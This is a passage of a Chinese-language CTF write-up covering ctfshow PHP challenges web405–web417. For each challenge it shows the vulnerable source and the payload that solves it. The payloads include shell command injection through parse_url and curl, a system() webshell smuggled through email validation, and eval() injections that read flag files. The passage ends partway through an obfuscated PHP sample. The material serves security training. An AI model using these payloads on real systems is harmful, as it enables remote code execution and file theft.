class="string">&#x27;url&#x27;</span>]))&#123;</span><br><span class="line">    <span class="variable">$url</span> = <span class="title function_ invoke__">parse_url</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;url&#x27;</span>]);</span><br><span class="line">    <span class="keyword">if</span>(<span class="title function_ invoke__">preg_match</span>(<span class="string">&#x27;/((2[0-4]\d|25[0-5]|[01]?\d\d?)\.)&#123;3&#125;(2[0-4]\d|25[0-5]|[01]?\d\d?)./&#x27;</span>, <span class="variable">$url</span>[<span class="string">&#x27;host&#x27;</span>]))&#123;</span><br><span class="line">        <span class="keyword">if</span>(<span class="title function_ invoke__">preg_match</span>(<span class="string">&#x27;/^\/[A-Za-z0-9]+$/&#x27;</span>, <span class="variable">$url</span>[<span class="string">&#x27;path&#x27;</span>]))&#123;</span><br><span class="line">            <span class="keyword">if</span>(<span class="title function_ invoke__">preg_match</span>(<span class="string">&#x27;/\~|\.|php/&#x27;</span>, <span class="variable">$url</span>[<span class="string">&#x27;scheme&#x27;</span>]))&#123;</span><br><span class="line">                <span class="title function_ invoke__">shell_exec</span>(<span class="string">&#x27;curl &#x27;</span>.<span class="variable">$url</span>[<span class="string">&#x27;scheme&#x27;</span>].<span class="variable">$url</span>[<span class="string">&#x27;host&#x27;</span>].<span class="variable">$url</span>[<span class="string">&#x27;path&#x27;</span>]);</span><br><span class="line">            &#125;</span><br><span class="line">            </span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&#x27;parse_url 好强大&#x27;</span>;</span><br><span class="line">&#125;</span><br><span class="line">parse_url 好强大</span><br></pre></td></tr></table></figure><figure class="highlight php"><table><tr><td class="code"><pre><span class="line">?url=httphp:<span class="comment">//127.0.0.1111;echo `cat f*`&gt;1.txt;11/a</span></span><br></pre></td></tr></table></figure><h1 id="web406"><a href="#web406" class="headerlink" title="web406"></a>web406</h1><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"> <span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"><span class="comment"> Author: h1xa</span></span><br><span class="line"><span class="comment"> Date:   2021-01-16 14:58:50</span></span><br><span class="line"><span class="comment"> Last Modified by:   h1xa</span></span><br><span class="line"><span class="comment"> Last Modified time: 2021-01-16 16:00:51</span></span><br><span class="line"><span class="comment"> email: h1xa<span class="doctag">@ctfer</span>.com</span></span><br><span class="line"><span class="comment"> link: https://ctfer.com</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">require</span> <span class="string">&#x27;config.php&#x27;</span>;</span><br><span class="line"><span class="comment">//flag in db</span></span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="variable">$url</span>=<span class="variable">$_GET</span>[<span class="string">&#x27;url&#x27;</span>];</span><br><span class="line"><span class="keyword">if</span>(<span class="title function_ invoke__">filter_var</span> (<span class="variable">$url</span>,FILTER_VALIDATE_URL))&#123;</span><br><span class="line">    <span class="variable">$sql</span> = <span class="string">&quot;select * from links where url =&#x27;<span class="subst">&#123;$url&#125;</span>&#x27;&quot;</span>;</span><br><span class="line">    <span class="variable">$result</span> = <span class="variable">$conn</span>-&gt;<span class="title function_ invoke__">query</span>(<span class="variable">$sql</span>);</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&#x27;不通过&#x27;</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">Notice: Undefined index: url in /<span class="keyword">var</span>/www/html/index.php on line <span class="number">17</span></span><br><span class="line">不通过</span><br></pre></td></tr></table></figure><p><a href="https://www.cnblogs.com/lxfweb/p/13757525.html">PHP代码审计02之filter_var()函数缺陷</a></p><h1 id="web407"><a href="#web407" class="headerlink" title="web407"></a>web407</h1><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"></span><br><span class="line"> <span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"><span class="comment"> Author: h1xa</span></span><br><span class="line"><span class="comment"> Date:   2021-01-16 14:58:50</span></span><br><span class="line"><span class="comment"> Last Modified by:   h1xa</span></span><br><span class="line"><span class="comment"> Last Modified time: 2021-01-16 17:24:13</span></span><br><span class="line"><span class="comment"> email: h1xa<span class="doctag">@ctfer</span>.com</span></span><br><span class="line"><span class="comment"> link: https://ctfer.com</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"><span class="variable">$ip</span>=<span class="variable">$_GET</span>[<span class="string">&#x27;ip&#x27;</span>];</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="title function_ invoke__">filter_var</span> (<span class="variable">$ip</span>,FILTER_VALIDATE_IP))&#123;</span><br><span class="line">    <span class="title function_ invoke__">call_user_func</span>(<span class="variable">$ip</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">cafe</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="built_in">static</span> <span class="function"><span class="keyword">function</span> <span class="title">add</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="title function_ invoke__">file_get_contents</span>(<span class="string">&#x27;flag.php&#x27;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure><p>IPv6的128位地址通常写成8组，每组为四个十六进制数的形式。比如：AD80:0000:0000:0000:ABAA:0000:00C2:0002  是一个合法的IPv6地址。这个地址比较长，看起来不方便也不易于书写。零压缩法可以用来缩减其长度。如果几个连续段位的值都是0，那么这些0就可以简单的以::来表示</p><p>被认为是ipv6地址</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line">?ip=cafe::<span class="variable constant_">add</span></span><br></pre></td></tr></table></figure><h1 id="web408"><a href="#web408" class="headerlink" title="web408"></a>web408</h1><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"> <span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"><span class="comment"> Author: h1xa</span></span><br><span class="line"><span class="comment"> Date:   2021-01-16 14:58:50</span></span><br><span class="line"><span class="comment"> Last Modified by:   h1xa</span></span><br><span class="line"><span class="comment"> Last Modified time: 2021-01-16 19:53:18</span></span><br><span class="line"><span class="comment"> email: h1xa<span class="doctag">@ctfer</span>.com</span></span><br><span class="line"><span class="comment"> link: https://ctfer.com</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"><span class="variable">$email</span>=<span class="variable">$_GET</span>[<span class="string">&#x27;email&#x27;</span>];</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="title function_ invoke__">filter_var</span> (<span class="variable">$email</span>,FILTER_VALIDATE_EMAIL))&#123;</span><br><span class="line">    <span class="title function_ invoke__">file_put_contents</span>(<span class="title function_ invoke__">explode</span>(<span class="string">&#x27;@&#x27;</span>, <span class="variable">$email</span>)[<span class="number">1</span>], <span class="title function_ invoke__">explode</span>(<span class="string">&#x27;@&#x27;</span>, <span class="variable">$email</span>)[<span class="number">0</span>]);</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><figure class="highlight php"><table><tr><td class="code"><pre><span class="line">email=<span class="string">&quot;&lt;?=system(<span class="subst">$_POST</span>[1]);?&gt;&quot;</span>@<span class="number">123</span>.php</span><br></pre></td></tr></table></figure><p>非法字符可以放在双引号里面绕过检测</p><p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/image-20220415130131892.png" alt="image-20220415130131892"></p><p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/image-20220415130222833.png" alt="image-20220415130222833"></p><h1 id="web409"><a href="#web409" class="headerlink" title="web409"></a>web409</h1><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"> <span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"><span class="comment"> Author: h1xa</span></span><br><span class="line"><span class="comment"> Date:   2021-01-16 14:58:50</span></span><br><span class="line"><span class="comment"> Last Modified by:   h1xa</span></span><br><span class="line"><span class="comment"> Last Modified time: 2021-01-16 20:26:16</span></span><br><span class="line"><span class="comment"> email: h1xa<span class="doctag">@ctfer</span>.com</span></span><br><span class="line"><span class="comment"> link: https://ctfer.com</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"><span class="variable">$email</span>=<span class="variable">$_GET</span>[<span class="string">&#x27;email&#x27;</span>];</span><br><span class="line"><span class="keyword">if</span>(<span class="title function_ invoke__">filter_var</span> (<span class="variable">$email</span>,FILTER_VALIDATE_EMAIL))&#123;</span><br><span class="line">    <span class="variable">$email</span>=<span class="title function_ invoke__">preg_replace</span>(<span class="string">&#x27;/.flag/&#x27;</span>, <span class="string">&#x27;&#x27;</span>, <span class="variable">$email</span>);</span><br><span class="line">    <span class="keyword">eval</span>(<span class="variable">$email</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>@后面是不符合php语句格式的字符尝试闭合网页当中前面的&lt;?php</p><p>可行但是发现前面的”也是非法的<br>题目有个替换为.flag也就是把flag和它前面那个字符替换为空，这就可以把emai当中前面双引号这个非法字符给替换掉，避免在php环境里面出错</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line">?email=<span class="string">&quot;flagsystem(<span class="subst">$_POST</span>[1]);?&gt;&quot;</span>@<span class="number">123</span>.com</span><br><span class="line">POST</span><br><span class="line"><span class="number">1</span>=cat /flag</span><br></pre></td></tr></table></figure><p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/image-20220415130816722.png" alt="image-20220415130816722"></p><h1 id="web410"><a href="#web410" class="headerlink" title="web410"></a>web410</h1><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"> <span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"><span class="comment"> Author: h1xa</span></span><br><span class="line"><span class="comment"> Date:   2021-01-25 23:07:21</span></span><br><span class="line"><span class="comment"> Last Modified by:   h1xa</span></span><br><span class="line"><span class="comment"> Last Modified time: 2021-01-26 13:12:41</span></span><br><span class="line"><span class="comment"> email: h1xa<span class="doctag">@ctfer</span>.com</span></span><br><span class="line"><span class="comment"> link: https://ctfer.com</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"></span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"><span class="keyword">include</span>(<span class="string">&#x27;flag.php&#x27;</span>);</span><br><span class="line"><span class="variable">$b</span>=<span class="variable">$_GET</span>[<span class="string">&#x27;b&#x27;</span>];</span><br><span class="line"><span class="keyword">if</span>(<span class="title function_ invoke__">filter_var</span> (<span class="variable">$b</span>,FILTER_VALIDATE_BOOLEAN))&#123;</span><br><span class="line">    <span class="keyword">if</span>(<span class="variable">$b</span>==<span class="string">&#x27;true&#x27;</span> || <span class="title function_ invoke__">intval</span>(<span class="variable">$b</span>)&gt;<span class="number">0</span>)&#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&#x27;FLAG NOT HERE&#x27;</span>);</span><br><span class="line">    &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="variable">$flag</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"></span><br><span class="line">定义和用法</span><br><span class="line">FILTER_VALIDATE_BOOLEAN 过滤器把值作为布尔选项来验证。</span><br><span class="line"></span><br><span class="line">Name: <span class="string">&quot;boolean&quot;</span></span><br><span class="line">ID-number: <span class="number">258</span></span><br><span class="line">可能的返回值：</span><br><span class="line"></span><br><span class="line">如果是 <span class="string">&quot;1&quot;</span>, <span class="string">&quot;true&quot;</span>, <span class="string">&quot;on&quot;</span> 以及 <span class="string">&quot;yes&quot;</span>，则返回 <span class="literal">true</span>。</span><br><span class="line">如果是 <span class="string">&quot;0&quot;</span>, <span class="string">&quot;false&quot;</span>, <span class="string">&quot;off&quot;</span>, <span class="string">&quot;no&quot;</span> 以及 <span class="string">&quot;&quot;</span>，则返回 <span class="literal">false</span>。</span><br><span class="line">否则返回 <span class="literal">NULL</span>。</span><br><span class="line"></span><br></pre></td></tr></table></figure><figure class="highlight php"><table><tr><td class="code"><pre><span class="line">?b=yes</span><br></pre></td></tr></table></figure><h1 id="web411"><a href="#web411" class="headerlink" title="web411"></a>web411</h1><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"> <span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"><span class="comment"> Author: h1xa</span></span><br><span class="line"><span class="comment"> Date:   2021-01-25 23:07:21</span></span><br><span class="line"><span class="comment"> Last Modified by:   h1xa</span></span><br><span class="line"><span class="comment"> Last Modified time: 2021-01-26 13:12:41</span></span><br><span class="line"><span class="comment"> email: h1xa<span class="doctag">@ctfer</span>.com</span></span><br><span class="line"><span class="comment"> link: https://ctfer.com</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"></span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"><span class="keyword">include</span>(<span class="string">&#x27;flag.php&#x27;</span>);</span><br><span class="line"><span class="variable">$b</span>=<span class="variable">$_GET</span>[<span class="string">&#x27;b&#x27;</span>];</span><br><span class="line"><span class="keyword">if</span>(<span class="title function_ invoke__">filter_var</span> (<span class="variable">$b</span>,FILTER_VALIDATE_BOOLEAN))&#123;</span><br><span class="line">    <span class="keyword">if</span>(<span class="variable">$b</span>==<span class="string">&#x27;true&#x27;</span> || <span class="title function_ invoke__">intval</span>(<span class="variable">$b</span>)&gt;<span class="number">0</span> ||<span class="variable">$b</span>==<span class="string">&#x27;on&#x27;</span> || <span class="variable">$b</span>==<span class="string">&#x27;ON&#x27;</span>)&#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&#x27;FLAG NOT HERE&#x27;</span>);</span><br><span class="line">    &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="variable">$flag</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><figure class="highlight php"><table><tr><td class="code"><pre><span class="line">?b=yes</span><br></pre></td></tr></table></figure><h1 id="web412"><a href="#web412" class="headerlink" title="web412"></a>web412</h1><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"> <span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"><span class="comment"> Author: h1xa</span></span><br><span class="line"><span class="comment"> Date:   2021-01-25 23:07:21</span></span><br><span class="line"><span class="comment"> Last Modified by:   h1xa</span></span><br><span class="line"><span class="comment"> Last Modified time: 2021-01-26 16:19:28</span></span><br><span class="line"><span class="comment"> email: h1xa<span class="doctag">@ctfer</span>.com</span></span><br><span class="line"><span class="comment"> link: https://ctfer.com</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"></span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"></span><br><span class="line"><span class="variable">$ctfshow</span>=<span class="variable">$_POST</span>[<span class="string">&#x27;ctfshow&#x27;</span>];</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$ctfshow</span>))&#123;</span><br><span class="line">    <span class="title function_ invoke__">file_put_contents</span>(<span class="string">&#x27;flag.php&#x27;</span>, <span class="string">&#x27;//&#x27;</span>.<span class="variable">$ctfshow</span>,FILE_APPEND);</span><br><span class="line">    <span class="keyword">include</span>(<span class="string">&#x27;flag.php&#x27;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure><figure class="highlight php"><table><tr><td class="code"><pre><span class="line">ctfshow=<span class="meta">?&gt;</span><span class="meta">&lt;?php</span> <span class="keyword">eval</span>(<span class="variable">$_POST</span>[<span class="number">1</span>]);&amp;<span class="number">1</span>=<span class="title function_ invoke__">system</span>(<span class="string">&#x27;cat flag.php&#x27;</span>);</span><br></pre></td></tr></table></figure><p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/image-20220415132225921.png" alt="image-20220415132225921"></p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line">ctfshow=%<span class="number">0</span>asystem(<span class="string">&#x27;tac f*&#x27;</span>);</span><br></pre></td></tr></table></figure><h1 id="web413"><a href="#web413" class="headerlink" title="web413"></a>web413</h1><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"> <span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"><span class="comment"> Author: h1xa</span></span><br><span class="line"><span class="comment"> Date:   2021-01-25 23:07:21</span></span><br><span class="line"><span class="comment"> Last Modified by:   h1xa</span></span><br><span class="line"><span class="comment"> Last Modified time: 2021-01-26 16:19:28</span></span><br><span class="line"><span class="comment"> email: h1xa<span class="doctag">@ctfer</span>.com</span></span><br><span class="line"><span class="comment"> link: https://ctfer.com</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"></span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"></span><br><span class="line"><span class="variable">$ctfshow</span>=<span class="variable">$_POST</span>[<span class="string">&#x27;ctfshow&#x27;</span>];</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$ctfshow</span>))&#123;</span><br><span class="line">        <span class="title function_ invoke__">file_put_contents</span>(<span class="string">&#x27;flag.php&#x27;</span>, <span class="string">&#x27;/*&#x27;</span>.<span class="variable">$ctfshow</span>.<span class="string">&#x27;*/&#x27;</span>,FILE_APPEND);</span><br><span class="line">    <span class="keyword">include</span>(<span class="string">&#x27;flag.php&#x27;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">Notice: Undefined index: ctfshow in /<span class="keyword">var</span>/www/html/index.php on line <span class="number">16</span></span><br></pre></td></tr></table></figure><figure class="highlight php"><table><tr><td class="code"><pre><span class="line">ctfshow=/<span class="keyword">eval</span>(<span class="variable">$_POST</span>[<span class="number">1</span>]);/&amp;<span class="number">1</span>=<span class="title function_ invoke__">system</span>(‘cat flag.php’);</span><br></pre></td></tr></table></figure><p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/image-20220415133217378.png" alt="image-20220415133217378"></p><h1 id="web414"><a href="#web414" class="headerlink" title="web414"></a>web414</h1><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"> <span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"><span class="comment"> Author: h1xa</span></span><br><span class="line"><span class="comment"> Date:   2021-01-25 23:07:21</span></span><br><span class="line"><span class="comment"> Last Modified by:   h1xa</span></span><br><span class="line"><span class="comment"> Last Modified time: 2021-01-26 16:43:53</span></span><br><span class="line"><span class="comment"> email: h1xa<span class="doctag">@ctfer</span>.com</span></span><br><span class="line"><span class="comment"> link: https://ctfer.com</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"></span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="keyword">include</span>(<span class="string">&#x27;flag.php&#x27;</span>);</span><br><span class="line"><span class="variable">$ctfshow</span>=<span class="variable">$_GET</span>[<span class="string">&#x27;ctfshow&#x27;</span>];</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="variable">$ctfshow</span>==<span class="literal">true</span>)&#123;</span><br><span class="line">    <span class="keyword">if</span>(<span class="title function_ invoke__">sqrt</span>(<span class="variable">$ctfshow</span>)&gt;=<span class="title function_ invoke__">sqrt</span>(<span class="title function_ invoke__">intval</span>(<span class="variable">$flag</span>)))&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&#x27;FLAG_NOT_HERE&#x27;</span>;</span><br><span class="line">    &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="variable">$flag</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">Notice: Undefined index: ctfshow in /<span class="keyword">var</span>/www/html/index.php on line <span class="number">16</span></span><br><span class="line"></span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">?ctfshow=-1</span><br></pre></td></tr></table></figure><p>sqrt() 函数返回一个数的平方根。</p><p> 返回 number 的平方根，如果 number 是负数则返回 NAN。</p><h1 id="web415"><a href="#web415" class="headerlink" title="web415"></a>web415</h1><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"> <span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"><span class="comment"> Author: h1xa</span></span><br><span class="line"><span class="comment"> Date:   2021-01-25 23:07:21</span></span><br><span class="line"><span class="comment"> Last Modified by:   h1xa</span></span><br><span class="line"><span class="comment"> Last Modified time: 2021-01-26 19:15:52</span></span><br><span class="line"><span class="comment"> email: h1xa<span class="doctag">@ctfer</span>.com</span></span><br><span class="line"><span class="comment"> link: https://ctfer.com</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"></span><br><span class="line"><span class="variable">$k</span> = <span class="variable">$_GET</span>[k];</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">getflag</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="title function_ invoke__">file_get_contents</span>(<span class="string">&#x27;flag.php&#x27;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="variable">$k</span>==<span class="string">&#x27;getflag&#x27;</span>)&#123;</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">&#x27;FLAG_NOT_HERE&#x27;</span>);</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="title function_ invoke__">call_user_func</span>(<span class="variable">$k</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure><figure class="highlight php"><table><tr><td class="code"><pre><span class="line">?k=getflaG</span><br></pre></td></tr></table></figure><h1 id="web416"><a href="#web416" class="headerlink" title="web416"></a>web416</h1><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"> <span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"><span class="comment"> Author: h1xa</span></span><br><span class="line"><span class="comment"> Date:   2021-01-25 23:07:21</span></span><br><span class="line"><span class="comment"> Last Modified by:   h1xa</span></span><br><span class="line"><span class="comment"> Last Modified time: 2021-01-26 19:54:23</span></span><br><span class="line"><span class="comment"> email: h1xa<span class="doctag">@ctfer</span>.com</span></span><br><span class="line"><span class="comment"> link: https://ctfer.com</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">ctf</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">getflag</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&#x27;fake flag&#x27;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">final</span> <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">flag</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="title function_ invoke__">file_get_contents</span>(<span class="string">&#x27;flag.php&#x27;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">show</span> <span class="keyword">extends</span> <span class="title">ctf</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"><span class="variable">$f</span></span>)</span>&#123;</span><br><span class="line">        <span class="title function_ invoke__">call_user_func</span>(<span class="variable">$f</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">echo</span> <span class="keyword">new</span> <span class="title class_">show</span>(<span class="variable">$_GET</span>[f]);</span><br></pre></td></tr></table></figure><figure class="highlight php"><table><tr><td class="code"><pre><span class="line">?f=ctf::<span class="variable constant_">flag</span></span><br></pre></td></tr></table></figure><h1 id="web417"><a href="#web417" class="headerlink" title="web417"></a>web417</h1><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"></span><br><span class="line"><span class="meta">&lt;?php</span> <span class="comment">/*ctfshow*/</span></span><br><span class="line"><span class="title function_ invoke__">define</span>(<span class="string">&#x27;aPeKTP0126&#x27;</span>, <span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="variable">$cIYMfW</span> = <span class="title function_ invoke__">urldecode</span>(<span class="string">&quot;%6E1%7A%62%2F%6D%615%5C%76%740%6928%2D%70%78%75%71%79%2A6%6C%72%6B%64%679%5F%65%68%63%73%77%6F4%2B%6637%6A&quot;</span>);</span><br><span class="line"><span class="variable">$CBhSfw</span> = <span class="variable">$cIYMfW</span>[<span class="number">3</span>] . <span class="variable">$cIYMfW</span>[<span class="number">6</span>] . <span class="variable">$cIYMfW</span>[<span class="number">33</span>] . <span class="variable">$cIYMfW</span>[<span class="number">30</span>];</span><br><span class="line"><span class="variable">$xWoIVy</span> = <span class="variable">$cIYMfW</span>[<span class="number">33</span>] . <span class="variable">$cIYMfW</span>[<span class="number">10</span>] . <span class="variable">$cIYMfW</span>[<span class="number">24</span>] . <span class="variable">$cIYMfW</span>[<span class="number">10</span>] . <span class="variable">$cIYMfW</span>[<span class="number">24</span>];</span><br><span class="line"><span class="variable">$RkEEuV</span> = <span class="variable">$xWoIVy</span>[<span class="number">0</span>] . <span class="variable">$cIYMfW</span>[<span class="number">18</span>] . <span class="variable">$cIYMfW</span>[<span class="number">3</span>] . <span class="variable">$xWoIVy</span>[<span class="number">0</span>] . <span class="variable">$xWoIVy</span>[<span class="number">1</span>] . <span class="variable">$cIYMfW</span>[<span class="number">24</span>];</span><br><span class="line"><span class="variable">$YFfKrW</span> = <span class="variable">$cIYMfW</span>[<span class="number">7</span>] . <span class="variable">$cIYMfW</span>[<span class="number">13</span>];</span><br><span class="line"><span class="variable">$CBhSfw</span> .= <span class="variable">$cIYMfW</span>[<span class="number">22</span>] . <span class="variable">$cIYMfW</span>[<span class="number">36</span>] . <span class="variable">$cIYMfW</span>[<span class="number">29</span>] . <span class="variable">$cIYMfW</span>[<span class="number">26</span>] . <span class="variable">$cIYMfW</span>[<span class="number">30</span>] . <span class="variable">$cIYMfW</span>[<span class="number">32</span>] . <span class="variable">$cIYMfW</span>[<span class="number">35</span>] . <span 